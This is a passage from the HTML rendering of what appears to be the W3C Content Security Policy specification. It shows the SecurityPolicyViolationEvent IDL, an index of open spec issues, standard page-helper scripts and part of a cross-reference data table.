<c- b>interface</c-> <a href="#securitypolicyviolationevent"><code><c- g>SecurityPolicyViolationEvent</c-></code></a> : <a data-link-type="idl-name" href="https://dom.spec.whatwg.org/#event"><c- n>Event</c-></a> {
    <a href="#dom-securitypolicyviolationevent-securitypolicyviolationevent"><code><c- g>constructor</c-></code></a>(<a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString"><c- b>DOMString</c-></a> <a href="#dom-securitypolicyviolationevent-securitypolicyviolationevent-type-eventinitdict-type"><code><c- g>type</c-></code></a>, <c- b>optional</c-> <a data-link-type="idl-name" href="#dictdef-securitypolicyviolationeventinit"><c- n>SecurityPolicyViolationEventInit</c-></a> <a href="#dom-securitypolicyviolationevent-securitypolicyviolationevent-type-eventinitdict-eventinitdict"><code><c- g>eventInitDict</c-></code></a> = {});
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString"><c- b>USVString</c-></a>      <a data-readonly data-type="USVString" href="#dom-securitypolicyviolationevent-documenturl"><code><c- g>documentURL</c-></code></a>;
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString"><c- b>USVString</c-></a>      <a class="idl-code" data-link-type="attribute" data-readonly data-type="USVString" href="#dom-securitypolicyviolationevent-documenturi"><c- g>documentURI</c-></a>; // historical alias of documentURL
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString"><c- b>USVString</c-></a>      <a data-readonly data-type="USVString" href="#dom-securitypolicyviolationevent-referrer"><code><c- g>referrer</c-></code></a>;
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString"><c- b>USVString</c-></a>      <a data-readonly data-type="USVString" href="#dom-securitypolicyviolationevent-blockedurl"><code><c- g>blockedURL</c-></code></a>;
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString"><c- b>USVString</c-></a>      <a class="idl-code" data-link-type="attribute" data-readonly data-type="USVString" href="#dom-securitypolicyviolationevent-blockeduri"><c- g>blockedURI</c-></a>; // historical alias of blockedURL
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString"><c- b>DOMString</c-></a>      <a data-readonly data-type="DOMString" href="#dom-securitypolicyviolationevent-effectivedirective"><code><c- g>effectiveDirective</c-></code></a>;
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString"><c- b>DOMString</c-></a>      <a class="idl-code" data-link-type="attribute" data-readonly data-type="DOMString" href="#dom-securitypolicyviolationevent-violateddirective"><c- g>violatedDirective</c-></a>; // historical alias of effectiveDirective
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString"><c- b>DOMString</c-></a>      <a data-readonly data-type="DOMString" href="#dom-securitypolicyviolationevent-originalpolicy"><code><c- g>originalPolicy</c-></code></a>;
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString"><c- b>USVString</c-></a>      <a data-readonly data-type="USVString" href="#dom-securitypolicyviolationevent-sourcefile"><code><c- g>sourceFile</c-></code></a>;
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString"><c- b>DOMString</c-></a>      <a data-readonly data-type="DOMString" href="#dom-securitypolicyviolationevent-sample"><code><c- g>sample</c-></code></a>;
    <c- b>readonly</c->    <c- b>attribute</c-> <a data-link-type="idl-name" href="#enumdef-securitypolicyviolationeventdisposition"><c- n>SecurityPolicyViolationEventDisposition</c-></a>      <a data-readonly data-type="SecurityPolicyViolationEventDisposition" href="#dom-securitypolicyviolationevent-disposition"><code><c- g>disposition</c-></code></a>;
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-unsigned-short"><c- b>unsigned</c-> <c- b>short</c-></a> <a data-readonly data-type="unsigned short" href="#dom-securitypolicyviolationevent-statuscode"><code><c- g>statusCode</c-></code></a>;
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-unsigned-long"><c- b>unsigned</c-> <c- b>long</c-></a>  <a data-readonly data-type="unsigned long" href="#dom-securitypolicyviolationevent-lineno"><code><c- g>lineno</c-></code></a>;
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-unsigned-long"><c- b>unsigned</c-> <c- b>long</c-></a>  <a class="idl-code" data-link-type="attribute" data-readonly data-type="unsigned long" href="#dom-securitypolicyviolationevent-linenumber"><c- g>lineNumber</c-></a>; // historical alias of lineno
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-unsigned-long"><c- b>unsigned</c-> <c- b>long</c-></a>  <a data-readonly data-type="unsigned long" href="#dom-securitypolicyviolationevent-colno"><code><c- g>colno</c-></code></a>;
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-unsigned-long"><c- b>unsigned</c-> <c- b>long</c-></a>  <a class="idl-code" data-link-type="attribute" data-readonly data-type="unsigned long" href="#dom-securitypolicyviolationevent-columnnumber"><c- g>columnNumber</c-></a>; // historical alias of colno
};

<c- b>dictionary</c-> <a href="#dictdef-securitypolicyviolationeventinit"><code><c- g>SecurityPolicyViolationEventInit</c-></code></a> : <a data-link-type="idl-name" href="https://dom.spec.whatwg.org/#dictdef-eventinit"><c- n>EventInit</c-></a> {
    <c- b>required</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString"><c- b>USVString</c-></a>      <a data-type="USVString" href="#dom-securitypolicyviolationeventinit-documenturl"><code><c- g>documentURL</c-></code></a>;
             <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString"><c- b>USVString</c-></a>      <a data-default="&quot;&quot;" data-type="USVString" href="#dom-securitypolicyviolationeventinit-referrer"><code><c- g>referrer</c-></code></a> = "";
             <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString"><c- b>USVString</c-></a>      <a data-default="&quot;&quot;" data-type="USVString" href="#dom-securitypolicyviolationeventinit-blockedurl"><code><c- g>blockedURL</c-></code></a> = "";
    <c- b>required</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString"><c- b>DOMString</c-></a>      <a data-type="DOMString" href="#dom-securitypolicyviolationeventinit-effectivedirective"><code><c- g>effectiveDirective</c-></code></a>;
    <c- b>required</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString"><c- b>DOMString</c-></a>      <a data-type="DOMString" href="#dom-securitypolicyviolationeventinit-originalpolicy"><code><c- g>originalPolicy</c-></code></a>;
             <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString"><c- b>USVString</c-></a>      <a data-default="&quot;&quot;" data-type="USVString" href="#dom-securitypolicyviolationeventinit-sourcefile"><code><c- g>sourceFile</c-></code></a> = "";
             <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString"><c- b>DOMString</c-></a>      <a data-default="&quot;&quot;" data-type="DOMString" href="#dom-securitypolicyviolationeventinit-sample"><code><c- g>sample</c-></code></a> = "";
    <c- b>required</c-> <a data-link-type="idl-name" href="#enumdef-securitypolicyviolationeventdisposition"><c- n>SecurityPolicyViolationEventDisposition</c-></a> <a data-type="SecurityPolicyViolationEventDisposition" href="#dom-securitypolicyviolationeventinit-disposition"><code><c- g>disposition</c-></code></a>;
    <c- b>required</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-unsigned-short"><c- b>unsigned</c-> <c- b>short</c-></a> <a data-type="unsigned short" href="#dom-securitypolicyviolationeventinit-statuscode"><code><c- g>statusCode</c-></code></a>;
             <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-unsigned-long"><c- b>unsigned</c-> <c- b>long</c-></a>  <a data-default="0" data-type="unsigned long" href="#dom-securitypolicyviolationeventinit-lineno"><code><c- g>lineno</c-></code></a> = 0;
             <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-unsigned-long"><c- b>unsigned</c-> <c- b>long</c-></a>  <a data-default="0" data-type="unsigned long" href="#dom-securitypolicyviolationeventinit-colno"><code><c- g>colno</c-></code></a> = 0;
};

</pre>
  <h2 class="no-num no-ref heading settled" id="issues-index"><span class="content">Issues Index</span><a class="self-link" href="#issues-index"></a></h2>
  <div style="counter-reset:issue">
   <div class="issue"> Is this kind of thing specified anywhere? I didn’t see anything
  that looked useful in <a data-link-type="biblio" href="#biblio-ecma262" title="ECMAScript® Language Specification">[ECMA262]</a>. <a class="issue-return" href="#issue-ee968c9a" title="Jump to section">↵</a></div>
   <div class="issue"> How, exactly, do we get the status code? We don’t actually store it
  anywhere. <a class="issue-return" href="#issue-d43ce829" title="Jump to section">↵</a></div>
   <div class="issue"> Stylesheet loading is not yet integrated with
  Fetch in WHATWG’s HTML. <a href="https://github.com/whatwg/html/issues/968">[Issue #whatwg/html#968]</a> <a class="issue-return" href="#issue-5599665e" title="Jump to section">↵</a></div>
   <div class="issue"> <code class="idl"><a data-link-type="idl" href="https://tc39.github.io/ecma262#sec-hostensurecancompilestrings">HostEnsureCanCompileStrings()</a></code> does not include the string which is
  going to be compiled as a parameter. We’ll also need to update HTML to pipe that value through
  to CSP. <a href="https://github.com/tc39/ecma262/issues/938">[Issue #tc39/ecma262#938]</a> <a class="issue-return" href="#issue-d5a07bef" title="Jump to section">↵</a></div>
   <div class="issue"> This needs to be better explained. <a href="https://github.com/w3c/webappsec-csp/issues/212">[Issue #w3c/webappsec-csp#212]</a> <a class="issue-return" href="#issue-ba1a0a35" title="Jump to section">↵</a></div>
   <div class="issue"> Do something interesting to the execution context in order to lock down
  interesting CSSOM algorithms. I don’t think CSSOM gives us any hooks here, so
  let’s work with them to put something reasonable together. <a class="issue-return" href="#issue-6fa220c3" title="Jump to section">↵</a></div>
   <div class="issue"> Spell this out in more detail as part of defining <code>X-Frame-Options</code> integration with the <a data-link-type="dfn">process a navigate response</a> algorithm. <a href="https://github.com/whatwg/html/issues/1230">[Issue #whatwg/html#1230]</a> <a class="issue-return" href="#issue-c6a38617" title="Jump to section">↵</a></div>
   <div class="issue"> We need some sort of hook in HTML to record this error if we’re
  planning on using it here. <a href="https://github.com/whatwg/html/issues/3257">[Issue #whatwg/html#3257]</a> <a class="issue-return" href="#issue-820579ab" title="Jump to section">↵</a></div>
   <div class="issue"> This processing is meant to mitigate the risk
  of dangling markup attacks that steal the nonce from an existing element
  in order to load injected script. It is fairly expensive, however, as it
  requires that we walk through all attributes and their values in order to
  determine whether the script should execute. Here, we try to minimize the
  impact by doing this check only for <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script">script</a></code> elements when a nonce is
  present, but we should probably consider this algorithm as "at risk" until
  we know its impact. <a href="https://github.com/w3c/webappsec-csp/issues/98">[Issue #w3c/webappsec-csp#98]</a> <a class="issue-return" href="#issue-4592ac7e" title="Jump to section">↵</a></div>
   <div class="issue"> Currently the HTML spec’s parsing algorithm removes this information
  before the <a href="#is-element-nonceable">§ 6.6.3.1 Is element nonceable?</a> algorithm can be run which makes it
  impossible to actually detect duplicate attributes. <a href="https://github.com/whatwg/html/issues/3257">[Issue #whatwg/html#3257]</a> <a class="issue-return" href="#issue-74cb0fbd" title="Jump to section">↵</a></div>
  </div>
<script>/* Boilerplate: script-dom-helper */
"use strict";
function query(sel) { return document.querySelector(sel); }

function queryAll(sel) { return [...document.querySelectorAll(sel)]; }

function iter(obj) {
	if(!obj) return [];
	var it = obj[Symbol.iterator];
	if(it) return it;
	return Object.entries(obj);
}

function mk(tagname, attrs, ...children) {
	const el = document.createElement(tagname);
	for(const [k,v] of iter(attrs)) {
		if(k.slice(0,3) == "_on") {
			const eventName = k.slice(3);
			el.addEventListener(eventName, v);
		} else if(k[0] == "_") {
			// property, not attribute
			el[k.slice(1)] = v;
		} else {
			if(v === false || v == null) {
        continue;
      } else if(v === true) {
        el.setAttribute(k, "");
        continue;
      } else {
  			el.setAttribute(k, v);
      }
		}
	}
	append(el, children);
	return el;
}

/* Create shortcuts for every known HTML element */
[
  "a",
  "abbr",
  "acronym",
  "address",
  "applet",
  "area",
  "article",
  "aside",
  "audio",
  "b",
  "base",
  "basefont",
  "bdo",
  "big",
  "blockquote",
  "body",
  "br",
  "button",
  "canvas",
  "caption",
  "center",
  "cite",
  "code",
  "col",
  "colgroup",
  "datalist",
  "dd",
  "del",
  "details",
  "dfn",
  "dialog",
  "div",
  "dl",
  "dt",
  "em",
  "embed",
  "fieldset",
  "figcaption",
  "figure",
  "font",
  "footer",
  "form",
  "frame",
  "frameset",
  "head",
  "header",
  "h1",
  "h2",
  "h3",
  "h4",
  "h5",
  "h6",
  "hr",
  "html",
  "i",
  "iframe",
  "img",
  "input",
  "ins",
  "kbd",
  "label",
  "legend",
  "li",
  "link",
  "main",
  "map",
  "mark",
  "meta",
  "meter",
  "nav",
  "nobr",
  "noscript",
  "object",
  "ol",
  "optgroup",
  "option",
  "output",
  "p",
  "param",
  "pre",
  "progress",
  "q",
  "s",
  "samp",
  "script",
  "section",
  "select",
  "small",
  "source",
  "span",
  "strike",
  "strong",
  "style",
  "sub",
  "summary",
  "sup",
  "table",
  "tbody",
  "td",
  "template",
  "textarea",
  "tfoot",
  "th",
  "thead",
  "time",
  "title",
  "tr",
  "u",
  "ul",
  "var",
  "video",
  "wbr",
  "xmp",
].forEach(tagname=>{
	mk[tagname] = (...args) => mk(tagname, ...args);
});

function* nodesFromChildList(children) {
	for(const child of children.flat(Infinity)) {
		if(child instanceof Node) {
			yield child;
		} else {
			yield new Text(child);
		}
	}
}
function append(el, ...children) {
	for(const child of nodesFromChildList(children)) {
		if(el instanceof Node) el.appendChild(child);
		else el.push(child);
	}
	return el;
}

function insertAfter(el, ...children) {
	for(const child of nodesFromChildList(children)) {
		el.parentNode.insertBefore(child, el.nextSibling);
	}
	return el;
}

function clearContents(el) {
	el.innerHTML = "";
	return el;
}

function parseHTML(markup) {
	if(markup.toLowerCase().trim().indexOf('<!doctype') === 0) {
		const doc = document.implementation.createHTMLDocument("");
		doc.documentElement.innerHTML = markup;
		return doc;
	} else {
		const el = mk.template({});
		el.innerHTML = markup;
		return el.content;
	}
}</script>
<script>/* Boilerplate: script-dfn-panel */
"use strict";
{
let dfnPanelData = {
"01149665": {"dfnID":"01149665","dfnText":"scheme","external":true,"refSections":[{"refs":[{"id":"ref-for-section-3.1"},{"id":"ref-for-section-3.1\u2460"}],"title":"2.3.1. Source Lists"}],"url":"https://tools.ietf.org/html/rfc3986#section-3.1"},
"0303e8e5": {"dfnID":"0303e8e5","dfnText":"utf-8 encode","external":true,"refSections":[{"refs":[{"id":"ref-for-utf-8-encode"}],"title":"6.6.3.3. \n    Does element match source list for type and source?\n  "},{"refs":[{"id":"ref-for-utf-8-encode\u2460"}],"title":"8.4. \n      Allowing external JavaScript via hashes\n    "}],"url":"https://encoding.spec.whatwg.org/#utf-8-encode"},
"04e0443f": {"dfnID":"04e0443f","dfnText":"document","external":true,"refSections":[{"refs":[{"id":"ref-for-dom-document-2"}],"title":"2.4.1. \n    Create a violation object for global, policy, and directive\n  "}],"url":"https://html.spec.whatwg.org/multipage/nav-history-apis.html#dom-document-2"},
"0698d556": {"dfnID":"0698d556","dfnText":"string","external":true,"refSections":[{"refs":[{"id":"ref-for-string"}],"title":"2.2.1. \n    Parse a serialized CSP\n  "},{"refs":[{"id":"ref-for-string\u2460"}],"title":"2.2.2. \n    Parse a serialized CSP list\n  "},{"refs":[{"id":"ref-for-string\u2461"},{"id":"ref-for-string\u2462"}],"title":"2.3. Directives"},{"refs":[{"id":"ref-for-string\u2463"},{"id":"ref-for-string\u2464"}],"title":"2.3.1. Source Lists"},{"refs":[{"id":"ref-for-string\u2465"}],"title":"2.4.1. \n    Create a violation object for global, policy, and directive\n  "}],"url":"https://infra.spec.whatwg.org/#string"},
"09f349d5": {"dfnID":"09f349d5","dfnText":"set the frozen base url","external":true,"refSections":[{"refs":[{"id":"ref-for-set-the-frozen-base-url"}],"title":"4.2. \n    Integration with HTML\n  "},{"refs":[{"id":"ref-for-set-the-frozen-base-url\u2460"}],"title":"6.2.1. base-uri"}],"url":"https://html.spec.whatwg.org/multipage/semantics.html#set-the-frozen-base-url"},
"0aa2f0c0": {"dfnID":"0aa2f0c0","dfnText":"referrer","external":true,"refSections":[{"refs":[{"id":"ref-for-dom-document-referrer"}],"title":"2.4.1. \n    Create a violation object for global, policy, and directive\n  "}],"url":"https://html.spec.whatwg.org/multipage/dom.html#dom-document-referrer"},
"0c0ceb78": {"dfnID":"0c0ceb78","dfnText":"bubbles","external":true,"refSections":[{"refs":[{"id":"ref-for-dom-event-bubbles"}],"title":"5.3. \n    Report a violation\n  "}],"url":"https://dom.spec.whatwg.org/#dom-event-bubbles"},
"0c9b0d3c": {"dfnID":"0c9b0d3c","dfnText":"WorkletGlobalScope","external":true,"refSections":[{"refs":[{"id":"ref-for-workletglobalscope"}],"title":"2.2. Policies"},{"refs":[{"id":"ref-for-workletglobalscope\u2460"},{"id":"ref-for-workletglobalscope\u2461"}],"title":"4.2. \n    Integration with HTML\n  "},{"refs":[{"id":"ref-for-workletglobalscope\u2462"}],"title":"4.2.2. \n    Initialize a global object\u2019s CSP list\n  "},{"refs":[{"id":"ref-for-workletglobalscope\u2463"}],"title":"4.2.3. \n    Retrieve the CSP list of an object\n  "}],"url":"https://html.spec.whatwg.org/multipage/worklets.html#workletglobalscope"},
"0cf3964f": {"dfnID":"0cf3964f","dfnText":"script","external":true,"refSections":[{"refs":[{"id":"ref-for-script"},{"id":"ref-for-script\u2460"}],"title":"1.3. Changes from Level 2"},{"refs":[{"id":"ref-for-script\u2461"}],"title":"3.3. \n    The <meta> element\n  "},{"refs":[{"id":"ref-for-script\u2462"},{"id":"ref-for-script\u2463"},{"id":"ref-for-script\u2464"}],"title":"6.1.11. script-src"},{"refs":[{"id":"ref-for-script\u2465"},{"id":"ref-for-script\u2466"}],"title":"6.6.3.1. \n    Is element nonceable?\n  "},{"refs":[{"id":"ref-for-script\u2467"},{"id":"ref-for-script\u2468"}],"title":"6.6.3.3. \n    Does element match source list for type and source?\n  "},{"refs":[{"id":"ref-for-script\u2460\u24ea"},{"id":"ref-for-script\u2460\u2460"},{"id":"ref-for-script\u2460\u2461"}],"title":"7.2.1. Dangling markup attacks"},{"refs":[{"id":"ref-for-script\u2460\u2462"},{"id":"ref-for-script\u2460\u2463"},{"id":"ref-for-script\u2460\u2464"}],"title":"8.2. \n    Usage of \"'strict-dynamic'\"\n  "},{"refs":[{"id":"ref-for-script\u2460\u2465"},{"id":"ref-for-script\u2460\u2466"},{"id":"ref-for-script\u2460\u2467"},{"id":"ref-for-script\u2460\u2468"},{"id":"ref-for-script\u2461\u24ea"}],"title":"8.4. \n      Allowing external JavaScript via hashes\n    "}],"url":"https://html.spec.whatwg.org/multipage/scripting.html#script"},
"122f01fb": {"dfnID":"122f01fb","dfnText":"setInterval(handler, timeout, ...arguments)","external":true,"refSections":[{"refs":[{"id":"ref-for-dom-setinterval"}],"title":"6.1.11. script-src"}],"url":"https://html.spec.whatwg.org/multipage/timers-and-user-prompts.html#dom-setinterval"},
"12553145": {"dfnID":"12553145","dfnText":"default port","external":true,"refSections":[{"refs":[{"id":"ref-for-default-port"}],"title":"6.6.2.6. \n    Does url match expression in origin with redirect count?\n  "},{"refs":[{"id":"ref-for-default-port\u2460"},{"id":"ref-for-default-port\u2461"}],"title":"6.6.2.9. \n    port-part matching\n  "}],"url":"https://url.spec.whatwg.org/#default-port"},
"129bdae8": {"dfnID":"129bdae8","dfnText":"Event","external":true,"refSections":[{"refs":[{"id":"ref-for-event"}],"title":"5.1. \n    Violation DOM Events\n  "}],"url":"https://dom.spec.whatwg.org/#event"},
"12b8dfc0": {"dfnID":"12b8dfc0","dfnText":"current settings object","external":true,"refSections":[{"refs":[{"id":"ref-for-current-settings-object"}],"title":"4.2.4. \n    Should element\u2019s inline type behavior be blocked by Content Security Policy?\n  "}],"url":"https://html.spec.whatwg.org/multipage/webappapis.html#current-settings-object"},
"15e48c39": {"dfnID":"15e48c39","dfnText":"set","external":true,"refSections":[{"refs":[{"id":"ref-for-ordered-set"}],"title":"2.2. Policies"},{"refs":[{"id":"ref-for-ordered-set\u2460"},{"id":"ref-for-ordered-set\u2461"}],"title":"2.3. Directives"},{"refs":[{"id":"ref-for-ordered-set\u2462"}],"title":"2.3.1. Source Lists"},{"refs":[{"id":"ref-for-ordered-set\u2463"},{"id":"ref-for-ordered-set\u2464"}],"title":"6.7.3. \n    Get fetch directive fallback list\n  "}],"url":"https://infra.spec.whatwg.org/#ordered-set"},
"16460342": {"dfnID":"16460342","dfnText":"owner set","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-WorkerGlobalScope-owner-set"}],"title":"4.2.2. \n    Initialize a global object\u2019s CSP list\n  "}],"url":"https://html.spec.whatwg.org/#concept-WorkerGlobalScope-owner-set"},
"165b73c9": {"dfnID":"165b73c9","dfnText":"SharedWorkerGlobalScope","external":true,"refSections":[{"refs":[{"id":"ref-for-sharedworkerglobalscope"}],"title":"4.2.2. \n    Initialize a global object\u2019s CSP list\n  "}],"url":"https://html.spec.whatwg.org/multipage/workers.html#sharedworkerglobalscope"},
"16d07e10": {"dfnID":"16d07e10","dfnText":"for each","external":true,"refSections":[{"refs":[{"id":"ref-for-list-iterate"}],"title":"2.2.2. \n    Parse a serialized CSP list\n  "}],"url":"https://infra.spec.whatwg.org/#list-iterate"},
"17bd86ff": {"dfnID":"17bd86ff","dfnText":"port (for URL)","external":true,"refSections":[{"refs":[{"id":"ref-for-dom-url-port"},{"id":"ref-for-dom-url-port\u2460"}],"title":"6.6.2.6. \n    Does url match expression in origin with redirect count?\n  "}],"url":"https://url.spec.whatwg.org/#dom-url-port"},
"1ab127d6": {"dfnID":"1ab127d6","dfnText":"window","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-request-window"}],"title":"5.3. \n    Report a violation\n  "}],"url":"https://fetch.spec.whatwg.org/#concept-request-window"},
"23cac254": {"dfnID":"23cac254","dfnText":"split a string on ascii whitespace","external":true,"refSections":[{"refs":[{"id":"ref-for-split-on-ascii-whitespace"}],"title":"2.2.1. \n    Parse a serialized CSP\n  "},{"refs":[{"id":"ref-for-split-on-ascii-whitespace\u2460"}],"title":"5.3. \n    Report a violation\n  "}],"url":"https://infra.spec.whatwg.org/#split-on-ascii-whitespace"},
"296f3551": {"dfnID":"296f3551","dfnText":"Element","external":true,"refSections":[{"refs":[{"id":"ref-for-element"}],"title":"2.3. Directives"},{"refs":[{"id":"ref-for-element\u2460"}],"title":"4.2.4. \n    Should element\u2019s inline type behavior be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-element\u2461"}],"title":"6.1.3.3. \n    default-src Inline Check\n  "},{"refs":[{"id":"ref-for-element\u2462"}],"title":"6.1.11.3. \n    script-src Inline Check\n  "},{"refs":[{"id":"ref-for-element\u2463"}],"title":"6.1.12.3. \n    script-src-elem Inline Check\n  "},{"refs":[{"id":"ref-for-element\u2464"}],"title":"6.1.13.1. \n    script-src-attr Inline Check\n  "},{"refs":[{"id":"ref-for-element\u2465"}],"title":"6.1.14.3. \n    style-src Inline Check\n  "},{"refs":[{"id":"ref-for-element\u2466"}],"title":"6.1.15.3. \n    style-src-elem Inline Check\n  "},{"refs":[{"id":"ref-for-element\u2467"}],"title":"6.1.16.1. \n    style-src-attr Inline Check\n  "},{"refs":[{"id":"ref-for-element\u2468"}],"title":"6.6.3.1. \n    Is element nonceable?\n  "},{"refs":[{"id":"ref-for-element\u2460\u24ea"}],"title":"6.6.3.3. \n    Does element match source list for type and source?\n  "}],"url":"https://dom.spec.whatwg.org/#element"},
"2aaa2f42": {"dfnID":"2aaa2f42","dfnText":"http fetch","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-http-fetch"},{"id":"ref-for-concept-http-fetch\u2460"}],"title":"4.1. \n    Integration with Fetch\n  "}],"url":"https://fetch.spec.whatwg.org/#concept-http-fetch"},
"2d5a2765": {"dfnID":"2d5a2765","dfnText":"ascii string","external":true,"refSections":[{"refs":[{"id":"ref-for-ascii-string"},{"id":"ref-for-ascii-string\u2460"}],"title":"2.2. Policies"},{"refs":[{"id":"ref-for-ascii-string\u2461"}],"title":"2.2.1. \n    Parse a serialized CSP\n  "},{"refs":[{"id":"ref-for-ascii-string\u2462"}],"title":"2.3. Directives"},{"refs":[{"id":"ref-for-ascii-string\u2463"}],"title":"2.3.1. Source Lists"},{"refs":[{"id":"ref-for-ascii-string\u2464"},{"id":"ref-for-ascii-string\u2465"},{"id":"ref-for-ascii-string\u2466"}],"title":"6.6.2.7. \n    scheme-part matching\n  "},{"refs":[{"id":"ref-for-ascii-string\u2467"},{"id":"ref-for-ascii-string\u2468"},{"id":"ref-for-ascii-string\u2460\u24ea"}],"title":"6.6.2.8. \n    host-part matching\n  "},{"refs":[{"id":"ref-for-ascii-string\u2460\u2460"},{"id":"ref-for-ascii-string\u2460\u2461"}],"title":"6.6.2.9. \n    port-part matching\n  "},{"refs":[{"id":"ref-for-ascii-string\u2460\u2462"},{"id":"ref-for-ascii-string\u2460\u2463"}],"title":"6.6.2.10. \n    path-part matching\n  "}],"url":"https://infra.spec.whatwg.org/#ascii-string"},
"30cbbf14": {"dfnID":"30cbbf14","dfnText":"parse a css rule","external":true,"refSections":[{"refs":[{"id":"ref-for-parse-a-css-rule"}],"title":"6.1.14. style-src"}],"url":"https://www.w3.org/TR/cssom-1/#parse-a-css-rule"},
"3144baec": {"dfnID":"3144baec","dfnText":"update a style block","external":true,"refSections":[{"refs":[{"id":"ref-for-update-a-style-block"}],"title":"4.2. \n    Integration with HTML\n  "}],"url":"https://html.spec.whatwg.org/multipage/semantics.html#update-a-style-block"},
"3268a8eb": {"dfnID":"3268a8eb","dfnText":"url (for response)","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-response-url"}],"title":"4.1.1. \n    Set response\u2019s CSP list\n  "},{"refs":[{"id":"ref-for-concept-response-url\u2460"}],"title":"4.2.1. \n    Initialize a Document\u2019s CSP list\n  "},{"refs":[{"id":"ref-for-concept-response-url\u2461"}],"title":"4.2.2. \n    Initialize a global object\u2019s CSP list\n  "},{"refs":[{"id":"ref-for-concept-response-url\u2462"}],"title":"4.2.6. \n    Should navigation response to navigation request of type\n    in target be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-concept-response-url\u2463"}],"title":"6.6.2.4. \n    Does response to request match source list?\n  "}],"url":"https://fetch.spec.whatwg.org/#concept-response-url"},
"3332e595": {"dfnID":"3332e595","dfnText":"setTimeout(handler, timeout, ...arguments)","external":true,"refSections":[{"refs":[{"id":"ref-for-dom-settimeout"}],"title":"6.1.11. script-src"}],"url":"https://html.spec.whatwg.org/multipage/timers-and-user-prompts.html#dom-settimeout"},
"3349d69f": {"dfnID":"3349d69f","dfnText":"associated document","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-document-window"}],"title":"4.2.3. \n    Retrieve the CSP list of an object\n  "},{"refs":[{"id":"ref-for-concept-document-window\u2460"},{"id":"ref-for-concept-document-window\u2461"}],"title":"5.3. \n    Report a violation\n  "}],"url":"https://html.spec.whatwg.org/multipage/nav-history-apis.html#concept-document-window"},
"35c08a82": {"dfnID":"35c08a82","dfnText":"resource representation","external":true,"refSections":[{"refs":[{"id":"ref-for-section-3"}],"title":"3. \n    Policy Delivery\n  "},{"refs":[{"id":"ref-for-section-3\u2460"},{"id":"ref-for-section-3\u2461"}],"title":"3.1. \n    The Content-Security-Policy HTTP Response Header Field\n  "},{"refs":[{"id":"ref-for-section-3\u2462"},{"id":"ref-for-section-3\u2463"}],"title":"3.2. \n    The Content-Security-Policy-Report-Only HTTP Response Header Field\n  "}],"url":"https://tools.ietf.org/html/rfc7231#section-3"},
"3a711be7": {"dfnID":"3a711be7","dfnText":"scheme","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-url-scheme"}],"title":"4.2.1. \n    Initialize a Document\u2019s CSP list\n  "},{"refs":[{"id":"ref-for-concept-url-scheme\u2460"}],"title":"4.2.2. \n    Initialize a global object\u2019s CSP list\n  "},{"refs":[{"id":"ref-for-concept-url-scheme\u2461"}],"title":"4.2.5. \n    Should navigation request of type be blocked\n    by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-concept-url-scheme\u2462"},{"id":"ref-for-concept-url-scheme\u2463"},{"id":"ref-for-concept-url-scheme\u2464"},{"id":"ref-for-concept-url-scheme\u2465"},{"id":"ref-for-concept-url-scheme\u2466"},{"id":"ref-for-concept-url-scheme\u2467"},{"id":"ref-for-concept-url-scheme\u2468"},{"id":"ref-for-concept-url-scheme\u2460\u24ea"},{"id":"ref-for-concept-url-scheme\u2460\u2460"}],"title":"6.6.2.6. \n    Does url match expression in origin with redirect count?\n  